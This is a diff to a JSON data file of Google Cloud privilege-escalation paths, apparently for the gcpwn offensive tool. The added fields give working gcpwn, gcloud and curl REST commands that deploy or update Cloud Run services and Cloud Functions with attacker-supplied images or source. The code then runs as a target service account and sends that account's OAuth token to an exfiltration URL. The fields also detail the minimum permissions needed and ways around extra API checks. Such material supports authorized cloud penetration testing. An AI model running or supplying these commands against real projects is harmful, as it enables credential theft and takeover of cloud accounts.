@@ -527,6 +527,27 @@
         },
         "description": "Deploy a Cloud Run service bound to the target SA to execute arbitrary code and exfiltrate the SA's OAuth token. The exploit container exfils at startup in a background thread — no run.routes.invoke is needed. Cloud Run's default health check is TCP-only (port-open); no HTTP GET is ever sent automatically, so the exfil must be in a startup thread rather than a request handler. Minimum: run.services.create + actAs on runtime SA. Use an attacker-controlled external image to avoid needing any AR permissions in the target project..",
         "example_command": "modules run exploit_cloudrun_service_as_sa --project-id {project_id} --target-sa {target_sa} --exfil-mode logs --cleanup",
+        "example_gcpwn_command": "modules run exploit_cloudrun_service_as_sa --project-id {project_id} --target-sa {target_sa} --exfil-mode logs --cleanup",
+        "example_gcloud_command": "gcloud run deploy SERVICE_NAME --image=ATTACKER_IMAGE --service-account={target_sa} --region=REGION --project={project_id} --no-allow-unauthenticated",
+        "example_curl_command": "curl -sS -X POST -H \"Authorization: Bearer $(gcloud auth print-access-token)\" -H \"Content-Type: application/json\" -d '{\"template\":{\"containers\":[{\"image\":\"ATTACKER_IMAGE\"}],\"serviceAccount\":\"{target_sa}\"}}' \"https://run.googleapis.com/v2/projects/{project_id}/locations/REGION/services?serviceId=SERVICE_NAME\"",
+        "general_caveats": [
+          "NO INVOKE NEEDED: Cloud Run's default health check is TCP-only. The exploit container exfils the SA token in a startup background thread 2-3 seconds after the TCP probe succeeds — no run.routes.invoke or HTTP GET is required.",
+          "IMAGE AR PERMISSIONS: The caller needs artifactregistry.repositories.downloadArtifacts on the IMAGE's repo wherever it lives. For an attacker-controlled external repo, grant yourself access there — no AR perms needed in the target project. Public/anonymous images require no AR perms anywhere.",
+          "CLOUD RUN SERVICE AGENT: The Cloud Run service agent (service-{project_number}@serverless-robot-prod.iam.gserviceaccount.com) in the target project must be able to pull the image at runtime. For images in an external private AR repo, grant the service agent roles/artifactregistry.reader on that external repo (attacker-side setup, not a target-project perm)."
+        ],
+        "example_gcpwn_command_caveats": [
+          "gcpwn uses the Cloud Run V2 GAPIC client which calls op.result() to wait for the LRO — this needs run.operations.get. Without it, gcpwn will print a 403 error but the exploit still succeeds: the service is already deployed and the exfil fires from the startup thread before the LRO timeout. In url exfil mode, check your callback instead of the gcpwn return code.",
+          "--exfil-mode logs reads the token from Cloud Logging and requires logging.logEntries.list in the target project — not in the minimum permission set for this edge. Use --exfil-url with a reachable callback instead when possible."
+        ],
+        "example_gcloud_command_caveats": [
+          "gcloud run deploy requires run.services.get beyond the minimum run.services.create + actAs. It uses the Knative serving v1 API under the hood and polls readiness via repeated GET on the service — it does NOT need run.operations.get. With only run.services.create + actAs, use the raw Cloud Run V2 REST API (example_curl_command).",
+          "gcloud checks AR access at deploy time and may surface artifactregistry.repositories.get pre-flight errors even when the minimum REST API call would succeed with the image in an external repo."
+        ],
+        "example_curl_command_caveats": [
+          "No polling needed for the attack — just POST the service and wait for the exfil callback. Cloud Run starts the container automatically; the startup thread fires and POSTs the token to your exfil URL with no further API calls required. run.services.get and run.operations.get are only needed if you want to programmatically confirm the service reached Ready state.",
+          "The container must listen on $PORT and pass Cloud Run's TCP startup probe within the timeout (default 240s). A container that never binds the port causes deployment to fail even if IAM is correct.",
+          "run.routes.invoke is NOT required when exfil is in a startup thread. The TCP probe triggers the container start and the exfil fires before any HTTP request."
+        ],
         "status": "VALIDATED",
         "actas_required": true,
         "caveats": [
@@ -555,6 +576,27 @@
         },
         "description": "Update an existing Cloud Run service to swap in a malicious container image (and optionally change the runtime SA) to exfiltrate the SA's OAuth token. The exploit container exfils at startup in a background thread — no run.routes.invoke is needed. actAs on the CURRENT service SA is ALWAYS required for any update — including image-only updates..",
         "example_command": "modules run exploit_cloudrun_service_as_sa --project-id {project_id} --target-sa {target_sa} --update-existing --service-name EXISTING_SERVICE --exfil-url https://EXFIL_URL --cleanup",
+        "example_gcpwn_command": "modules run exploit_cloudrun_service_as_sa --project-id {project_id} --target-sa {target_sa} --update-existing --service-name EXISTING_SERVICE --exfil-url https://EXFIL_URL --cleanup",
+        "example_gcloud_command": "gcloud run services update EXISTING_SERVICE --image=ATTACKER_IMAGE --service-account={target_sa} --region=REGION --project={project_id}",
+        "example_curl_command": "curl -sS -X PATCH -H \"Authorization: Bearer $(gcloud auth print-access-token)\" -H \"Content-Type: application/json\" -d '{\"template\":{\"containers\":[{\"image\":\"ATTACKER_IMAGE\"}],\"serviceAccount\":\"{target_sa}\"}}' \"https://run.googleapis.com/v2/projects/{project_id}/locations/REGION/services/EXISTING_SERVICE?updateMask=template.containers,template.serviceAccount\"",
+        "general_caveats": [
+          "ACTAS ALWAYS REQUIRED: Unlike Cloud Run Jobs, Cloud Run Services ALWAYS require actAs on the CURRENT service SA — even for image-only updates that do not change serviceAccountName. The Cloud Run V2 API returns PERMISSION_DENIED without actAs on the service's existing SA regardless of updateMask.",
+          "NO INVOKE NEEDED: Same as CREATE — the update creates a new revision; the container starts for the TCP health check and exfil fires in a startup thread.",
+          "IMAGE AR PERMISSIONS: Same as CREATE — the caller needs AR download perms on the image's repo; external/public images need no AR perms in the target project."
+        ],
+        "example_gcpwn_command_caveats": [
+          "gcpwn needs run.services.get beyond the minimum to read the existing service's current SA before updating. It also calls op.result() via GAPIC LRO which needs run.operations.get — without it gcpwn prints a 403 but the update is already applied and the exfil fires from the startup thread. In url mode, check your callback instead of gcpwn's return code.",
+          "--exfil-url is recommended over --exfil-mode logs; logs mode requires logging.logEntries.list in the target project — not in the minimum permission set."
+        ],
+        "example_gcloud_command_caveats": [
+          "gcloud run services update requires run.services.get beyond the minimum run.services.update + actAs. It uses the Knative serving v1 API (GET then PUT) and polls readiness via repeated GET — it does NOT need run.operations.get. With only run.services.update + actAs, use the raw Cloud Run V2 REST API PATCH (example_curl_command).",
+          "If --service-account is not specified, the service retains its existing SA — but actAs on the EXISTING SA is still required (Cloud Run enforces actAs on any service update)."
+        ],
+        "example_curl_command_caveats": [
+          "No polling needed for the attack — just PATCH the service and wait for the exfil callback. Cloud Run creates a new revision and starts the container automatically; the startup thread fires and POSTs the token to your exfil URL with no further API calls. run.services.get and run.operations.get are only needed to programmatically confirm Ready state.",
+          "Even for image-only updates (updateMask=template.containers without template.serviceAccount), actAs on the CURRENT service SA is required — the API enforces this regardless of what fields are in the updateMask.",
+          "To change just the image without changing the SA, include template.containers in updateMask and omit template.serviceAccount; actAs on the existing SA is still required."
+        ],
         "requires_resource_exists": true,
         "status": "VALIDATED",
         "capability_resource_type": "cloudrunservice",
@@ -801,6 +843,27 @@
         },
         "description": "Deploy a new Cloud Function gen1 (source-code path) with an explicit buildServiceAccount (build SA) and a separate runtime SA (target), then invoke it to exfiltrate the runtime SA's OAuth token. INVOKE IS REQUIRED: unlike FUNC/IMAGE Cloud Run edges, CF V1 is NOT backed by Cloud Run — the container cold-starts on the first HTTP invocation, so no code runs at deploy time. Attacker needs: cloudfunctions.functions.create + cloudfunctions.functions.call + actAs(build SA, is_cf_build_capable) + actAs(runtime SA). Minimum build SA perms: artifactregistry.repositories.downloadArtifacts + uploadArtifacts + logging.logEntries.create (external source bucket path)..",
         "example_command": "modules run exploit_cloudfunctions_function_as_sa --project-id {project_id} --target-sa {target_sa} --create --exfil-url https://EXFIL_URL",
+        "example_gcpwn_command": "modules run exploit_cloudfunctions_function_as_sa --project-id {project_id} --target-sa {target_sa} --create --exfil-url https://EXFIL_URL",
+        "example_gcloud_command": "gcloud functions deploy FUNC_NAME --runtime=python311 --trigger-http --source=SOURCE_DIR --entry-point=main --service-account={target_sa} --build-service-account=projects/{project_id}/serviceAccounts/{build_sa} --region=REGION --project={project_id} && gcloud functions call FUNC_NAME --region=REGION --project={project_id}",
+        "example_curl_command": "curl -sS -X POST -H \"Authorization: Bearer $(gcloud auth print-access-token)\" -H \"Content-Type: application/json\" -d '{\"name\":\"projects/{project_id}/locations/REGION/functions/FUNC_NAME\",\"httpsTrigger\":{},\"runtime\":\"python311\",\"entryPoint\":\"main\",\"sourceArchiveUrl\":\"gs://ATTACKER_BUCKET/func.zip\",\"serviceAccountEmail\":\"{target_sa}\",\"buildServiceAccount\":\"projects/{project_id}/serviceAccounts/{build_sa}\"}' \"https://cloudfunctions.googleapis.com/v1/projects/{project_id}/locations/REGION/functions\" && sleep 60 && curl -sS -H \"Authorization: Bearer $(gcloud auth print-access-token)\" \"https://REGION-{project_id}.cloudfunctions.net/FUNC_NAME\"",
+        "general_caveats": [
+          "INVOKE IS REQUIRED: CF V1 is not backed by Cloud Run. The execution environment cold-starts on the FIRST HTTP invocation — no code runs at deploy time. Token exfil must happen during the invoke step, not at deploy.",
+          "TWO-SA MODEL: The build SA and runtime SA are DISTINCT. The runtime SA needs zero build permissions — only the build SA needs is_cf_build_capable perms. Use `gcloud builds get-default-service-account --project={project_id}` to find the default Cloud Build SA.",
+          "INVOKE AUTHORIZATION: cloudfunctions.functions.call grants direct invocation via the functions.call API. Alternatively use run.routes.invoke on the underlying CR service, or allow allUsers/allAuthenticatedUsers HTTP."
+        ],
+        "example_gcpwn_command_caveats": [
+          "The module additionally needs cloudfunctions.functions.get (pre-flight to check existence) and cloudfunctions.operations.get (operation polling) beyond the minimum. Without operations.get the module cannot confirm the build completed before invoking.",
+          "Without run.routes.invoke or cloudfunctions.functions.call, use --exfil-mode logs to read the token from Cloud Logging after invocation. Reading logs requires logging.logEntries.list — not in the minimum permission set for this edge."
+        ],
+        "example_gcloud_command_caveats": [
+          "gcloud functions deploy requires cloudfunctions.functions.get, cloudfunctions.operations.get, cloudfunctions.functions.sourceCodeSet (gcloud calls generateUploadUrl for local --source directories to stage the zip), and resourcemanager.projects.get beyond the minimum. With only the minimum perms, use the raw REST API with sourceArchiveUrl (example_curl_command) which does NOT need sourceCodeSet.",
+          "gcloud functions call requires cloudfunctions.functions.call. If the function URL is public (allUsers), invoke via HTTP curl instead without additional perms."
+        ],
+        "example_curl_command_caveats": [
+          "The deploy call (functions.create) is asynchronous — it returns an Operation resource. Poll GET https://cloudfunctions.googleapis.com/v1/{operation.name} until done=true before invoking, otherwise the function may not be ready.",
+          "sourceArchiveUrl must be accessible to the Cloud Functions service agent (service-{PROJECT_NUMBER}@gcf-admin-robot.iam.gserviceaccount.com) and to the build SA at build time.",
+          "The invoke call requires an auth bearer token with cloudfunctions.functions.call or the function must allow allUsers."
+        ],
         "capability_resource_type": "cloudfunction",
         "status": "VALIDATED",
         "caveats": [
@@ -848,6 +911,27 @@
         },
         "description": "Update an existing Cloud Function gen1 (source-code path) with a new buildServiceAccount (build SA) and/or runtime SA, then invoke it to exfiltrate the runtime SA's OAuth token. INVOKE IS REQUIRED: CF V1 is not Cloud Run-backed; the container cold-starts on first invocation, so no code runs at deploy time. Attacker needs: cloudfunctions.functions.update + cloudfunctions.functions.call + actAs(build SA, is_cf_build_capable) + actAs(runtime SA). Minimum build SA perms: artifactregistry.repositories.downloadArtifacts + uploadArtifacts + logging.logEntries.create (external source bucket path)..",
         "example_command": "modules run exploit_cloudfunctions_function_as_sa --project-id {project_id} --target-sa {target_sa} --function-name EXISTING_FUNC --exfil-url https://EXFIL_URL",
+        "example_gcpwn_command": "modules run exploit_cloudfunctions_function_as_sa --project-id {project_id} --target-sa {target_sa} --function-name EXISTING_FUNC --exfil-url https://EXFIL_URL",
+        "example_gcloud_command": "gcloud functions deploy EXISTING_FUNC --runtime=python311 --source=SOURCE_DIR --entry-point=main --service-account={target_sa} --build-service-account=projects/{project_id}/serviceAccounts/{build_sa} --region=REGION --project={project_id} && gcloud functions call EXISTING_FUNC --region=REGION --project={project_id}",
+        "example_curl_command": "curl -sS -X PATCH -H \"Authorization: Bearer $(gcloud auth print-access-token)\" -H \"Content-Type: application/json\" -d '{\"httpsTrigger\":{},\"runtime\":\"python311\",\"entryPoint\":\"main\",\"sourceArchiveUrl\":\"gs://ATTACKER_BUCKET/func.zip\",\"serviceAccountEmail\":\"{target_sa}\",\"buildServiceAccount\":\"projects/{project_id}/serviceAccounts/{build_sa}\"}' \"https://cloudfunctions.googleapis.com/v1/projects/{project_id}/locations/REGION/functions/EXISTING_FUNC\" && sleep 60 && curl -sS -H \"Authorization: Bearer $(gcloud auth print-access-token)\" \"https://REGION-{project_id}.cloudfunctions.net/EXISTING_FUNC\"",
+        "general_caveats": [
+          "INVOKE IS REQUIRED: Same as CREATE — CF V1 cold-starts on first HTTP invocation; no code runs at deploy/update time. The updated function must be invoked to trigger exfil.",
+          "EXISTING BUILD SA: If the function already has a buildServiceAccount configured, the PATCH overwrites it with the value you send. The attacker needs actAs on the build SA specified in the request.",
+          "TWO-SA MODEL: Same as CREATE — build SA and runtime SA are distinct. Runtime SA needs zero build perms."
+        ],
+        "example_gcpwn_command_caveats": [
+          "The module additionally needs cloudfunctions.functions.get (to verify the function exists and read current config) and cloudfunctions.operations.get (operation polling) beyond the minimum.",
+          "Without run.routes.invoke or cloudfunctions.functions.call, use --exfil-mode logs (requires logging.logEntries.list — not in minimum set)."
+        ],
+        "example_gcloud_command_caveats": [
+          "gcloud functions deploy (update path) requires cloudfunctions.functions.get, cloudfunctions.operations.get, cloudfunctions.functions.sourceCodeSet (generateUploadUrl for local --source directories), and resourcemanager.projects.get beyond the minimum. With only the minimum perms, use the raw REST API PATCH with sourceArchiveUrl (example_curl_command) which does NOT need sourceCodeSet.",
+          "gcloud functions call requires cloudfunctions.functions.call. If the function is public, invoke via HTTP curl without this perm."
+        ],
+        "example_curl_command_caveats": [
+          "The PATCH call is asynchronous — poll GET https://cloudfunctions.googleapis.com/v1/{operation.name} until done=true before invoking.",
+          "The CF V1 API PATCH replaces all mutable fields with what you send if no updateMask is specified. Send all required fields (runtime, entryPoint, sourceArchiveUrl, serviceAccountEmail, buildServiceAccount, trigger) to avoid unintentional field erasure.",
+          "cloudfunctions.functions.sourceCodeSet is NOT required when using sourceArchiveUrl (direct GCS reference); only needed for the gcloud generateUploadUrl path."
+        ],
         "requires_resource_exists": true,
         "capability_resource_type": "cloudfunction",
         "status": "VALIDATED",
@@ -888,6 +972,27 @@
         },
         "description": "Deploy a new Cloud Functions gen2 function bound to the target SA to exfiltrate the SA's OAuth token. CF V2 is backed by Cloud Run; Cloud Run starts the container during deployment for the TCP health check. Module-level Python code (outside the handler) runs at import time — a startup background thread fires immediately, fetching the metadata token and exfilling it without any HTTP invocation. Minimum: cloudfunctions.functions.create + actAs on BOTH the runtime SA AND the build SA. run.routes.invoke is NOT required..",
         "example_command": "modules run exploit_cloudfunctions_function_as_sa --project-id {project_id} --target-sa {target_sa} --create --gen2 --exfil-url https://EXFIL_URL",
+        "example_gcpwn_command": "modules run exploit_cloudfunctions_function_as_sa --project-id {project_id} --target-sa {target_sa} --create --gen2 --exfil-url https://EXFIL_URL",
+        "example_gcloud_command": "gcloud functions deploy FUNC_NAME --gen2 --runtime=python311 --trigger-http --source=SOURCE_DIR --entry-point=main --service-account={target_sa} --build-service-account=projects/{project_id}/serviceAccounts/{build_sa} --region=REGION --project={project_id}",
+        "example_curl_command": "curl -sS -X POST -H \"Authorization: Bearer $(gcloud auth print-access-token)\" -H \"Content-Type: application/json\" -d '{\"name\":\"projects/{project_id}/locations/REGION/functions/FUNC_NAME\",\"buildConfig\":{\"runtime\":\"python311\",\"entryPoint\":\"main\",\"source\":{\"storageSource\":{\"bucket\":\"ATTACKER_BUCKET\",\"object\":\"func.zip\"}},\"serviceAccount\":\"projects/{project_id}/serviceAccounts/{build_sa}\"},\"serviceConfig\":{\"serviceAccountEmail\":\"{target_sa}\"}}' \"https://cloudfunctions.googleapis.com/v2/projects/{project_id}/locations/REGION/functions?functionId=FUNC_NAME\"",
+        "general_caveats": [
+          "NO INVOKE NEEDED: CF V2 is backed by Cloud Run. Cloud Run starts the container during deployment for the TCP health check. A startup background thread exfils the SA token 2-3 seconds after the TCP probe succeeds — no invocation required.",
+          "TWO-SA MODEL: Requires actAs on BOTH the runtime SA AND the build SA. Build SA defaults to the Compute Engine default SA ({project-number}-compute@developer.gserviceaccount.com) — use `gcloud builds get-default-service-account --project={project_id}` to find it.",
+          "GCF V2 STAGING BUCKET: The CF V2 API copies the source into the auto-created gcf-v2-sources-{project_number}-{region} staging bucket. The build SA additionally needs storage.objects.get on that bucket (encoded in is_cf_v2_build_capable). The default Compute Engine SA already has this access."
+        ],
+        "example_gcpwn_command_caveats": [
+          "The module additionally needs cloudfunctions.functions.get (pre-flight), cloudfunctions.operations.get (operation polling), and run.operations.get (Cloud Run operation polling) beyond the minimum.",
+          "Without a reachable exfil URL, use --exfil-mode logs (requires logging.logEntries.list — not in minimum set)."
+        ],
+        "example_gcloud_command_caveats": [
+          "gcloud functions deploy --gen2 requires cloudfunctions.functions.get, cloudfunctions.operations.get, cloudfunctions.functions.sourceCodeSet (generateUploadUrl for local --source directories), and resourcemanager.projects.get beyond the minimum. With only cloudfunctions.functions.create + actAs, use the raw REST API (example_curl_command) with storageSource which does NOT need sourceCodeSet.",
+          "gcloud fetches the default Cloud Build SA via cloudbuild.googleapis.com GetDefaultServiceAccount if --build-service-account is not specified — not in the minimum permission set."
+        ],
+        "example_curl_command_caveats": [
+          "The CF V2 create call is asynchronous — poll GET https://cloudfunctions.googleapis.com/v2/{operation.name} until done=true.",
+          "run.services.create is NOT required — the CF V2 API provisions the backing Cloud Run service automatically.",
+          "The source.storageSource bucket must be readable by the build SA. The CF V2 API stages it into gcf-v2-sources-{project_number}-{region}; the build SA needs storage.objects.get on that staging bucket."
+        ],
         "capability_resource_type": "cloudfunction",
         "status": "VALIDATED",
         "caveats": [
@@ -927,6 +1032,27 @@
         },
         "description": "Update an existing Cloud Functions gen2 function to swap its runtime SA and/or source code to exfiltrate the target SA's OAuth token. Same startup-thread mechanism as CF V2 CREATE: on update Cloud Run creates a new revision, starts the container for the TCP health check, and module-level code fires at import time before any HTTP request. Minimum: cloudfunctions.functions.update + actAs on BOTH the runtime SA AND the build SA. run.routes.invoke is NOT required. The startup thread mechanism is identical to CF V2 CREATE — Cloud Run uses the same revision rollout process for updates.",
         "example_command": "modules run exploit_cloudfunctions_function_as_sa --project-id {project_id} --target-sa {target_sa} --function-name EXISTING_FUNC --gen2 --exfil-url https://EXFIL_URL",
+        "example_gcpwn_command": "modules run exploit_cloudfunctions_function_as_sa --project-id {project_id} --target-sa {target_sa} --function-name EXISTING_FUNC --gen2 --exfil-url https://EXFIL_URL",
+        "example_gcloud_command": "gcloud functions deploy EXISTING_FUNC --gen2 --runtime=python311 --source=SOURCE_DIR --entry-point=main --service-account={target_sa} --build-service-account=projects/{project_id}/serviceAccounts/{build_sa} --region=REGION --project={project_id}",
+        "example_curl_command": "curl -sS -X PATCH -H \"Authorization: Bearer $(gcloud auth print-access-token)\" -H \"Content-Type: application/json\" -d '{\"buildConfig\":{\"source\":{\"storageSource\":{\"bucket\":\"ATTACKER_BUCKET\",\"object\":\"func.zip\"}},\"serviceAccount\":\"projects/{project_id}/serviceAccounts/{build_sa}\"},\"serviceConfig\":{\"serviceAccountEmail\":\"{target_sa}\"}}' \"https://cloudfunctions.googleapis.com/v2/projects/{project_id}/locations/REGION/functions/EXISTING_FUNC?updateMask=buildConfig.source,buildConfig.serviceAccount,serviceConfig.serviceAccountEmail\"",
+        "general_caveats": [
+          "NO INVOKE NEEDED: Same as CF V2 CREATE — update creates a new Cloud Run revision; the container starts for the TCP health check and module-level startup thread fires immediately.",
+          "TWO-SA MODEL: Same as CREATE — requires actAs on BOTH the runtime SA AND the build SA.",
+          "GCF V2 STAGING BUCKET: Same staging bucket requirement as CREATE — build SA needs storage.objects.get on gcf-v2-sources-{project_number}-{region} (encoded in is_cf_v2_build_capable)."
+        ],
+        "example_gcpwn_command_caveats": [
+          "The module additionally needs cloudfunctions.functions.get (pre-flight), cloudfunctions.operations.get, and run.operations.get beyond the minimum.",
+          "Without a reachable exfil URL, use --exfil-mode logs (requires logging.logEntries.list — not in minimum set)."
+        ],
+        "example_gcloud_command_caveats": [
+          "gcloud functions deploy --gen2 requires cloudfunctions.functions.get, cloudfunctions.operations.get, cloudfunctions.functions.sourceCodeSet (generateUploadUrl for local --source directories), and resourcemanager.projects.get beyond the minimum. With only cloudfunctions.functions.update + actAs, use the raw REST API PATCH with storageSource (example_curl_command) which does NOT need sourceCodeSet.",
+          "gcloud fetches the default Cloud Build SA via cloudbuild.googleapis.com GetDefaultServiceAccount if --build-service-account is not specified — not in the minimum permission set."
+        ],
+        "example_curl_command_caveats": [
+          "The PATCH call is asynchronous — poll GET https://cloudfunctions.googleapis.com/v2/{operation.name} until done=true.",
+          "Use updateMask to restrict changes. Minimum useful mask: buildConfig.source,buildConfig.serviceAccount,serviceConfig.serviceAccountEmail.",
+          "run.services.update is NOT required — the CF V2 API updates the backing Cloud Run service automatically."
+        ],
         "requires_resource_exists": true,
         "capability_resource_type": "cloudfunction",
         "status": "VALIDATED",
